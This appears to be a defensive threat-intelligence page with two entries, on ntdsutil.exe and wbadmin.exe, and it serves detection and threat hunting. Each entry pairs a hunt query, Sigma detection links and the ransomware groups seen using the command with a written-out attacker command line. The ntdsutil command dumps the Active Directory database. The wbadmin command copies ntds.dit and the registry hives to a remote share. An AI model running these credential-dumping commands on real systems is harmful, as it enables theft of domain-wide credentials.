# Cyber Attack Defend (CAD) Intelligence

## ntdsutil.exe (Active Directory Database Dumping)

  **INDICATOR**: ```ntdsutil.exe "ac i ntds" "ifm" "create full C:\Windows\Temp\<folder_name>" q q```
  
<details>

<summary>CAD Details</summary>

| TITLE | DETAILS |
| :-----------: | :-----------: |
| _PLATFORM(S)_ | Windows |
| _ARTIFACT(S)_ | d3f:Process; d3f:File; d3f:EncryptedCredential |
| _COUNTERMEASURE(S)_ | d3f:ProcessLineageAnalysis; d3f:FileAnalysis; d3f:CredentialCompromiseScopeAnalysis |
| _EVIDENCE(S)_ | edr:```Parent Process (<process_name>.exe) > Child Process ("C:\Windows\System32\ntdsutil.exe" "<commandline>```; <br> siem:```Event ID: 4688```; ```Sysmon Event ID: 1, 11``` |
| _DETECTION_ | [Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_ntdsutil_usage/) |
| _HUNT_ | ```(Image:"*\\ntdsutil.exe") AND (CommandLine:"*ac i ntds*") AND (CommandLine:"*ifm*") AND (CommandLine:"*create full*")``` |
| _ACTOR(S) SEEN_ | Qilin, DragonForce, Anubis, BERT |
| _MALWARE(S) SEEN_ | N/A |
| _REFERENCE(S)_ | [Microsoft](https://www.microsoft.com/) |

</details>

---

## wbadmin.exe (Sensitive File Dump via Backup)

  **INDICATOR**: ```wbadmin.exe start backup -backuptarget:\\<ip_address>\C$\ProgramData\ -include:C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY -quiet```
  
<details>

<summary>CAD Details</summary>

| TITLE | DETAILS |
| :-----------: | :-----------: |
| _PLATFORM(S)_ | Windows |
| _ARTIFACT(S)_ | d3f:Process; d3f:File; d3f:EncryptedCredential |
| _COUNTERMEASURE(S)_ | d3f:ProcessLineageAnalysis; d3f:FileAnalysis; d3f:CredentialCompromiseScopeAnalysis |
| _EVIDENCE(S)_ | edr:```Parent Process (cmd.exe / powershell.exe) > Child Process ("C:\Windows\System32\wbadmin.exe" start backup ...)```; <br> siem:```Event ID: 4688```; ```Sysmon Event ID: 1``` |
| _DETECTION_ | [Sensitive File Dump Via Wbadmin.EXE](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files/) |
| _HUNT_ | ```(Image:"*\\wbadmin.exe") AND (CommandLine:"*start*") AND (CommandLine:"*backup*") AND (CommandLine:"*ntds.dit*")``` |
| _ACTOR(S) SEEN_ | AKIRA |
| _MALWARE(S) SEEN_ | N/A |
| _REFERENCE(S)_ | [The DFIR Report](https://thedfirreport.com/) |

</details>

---


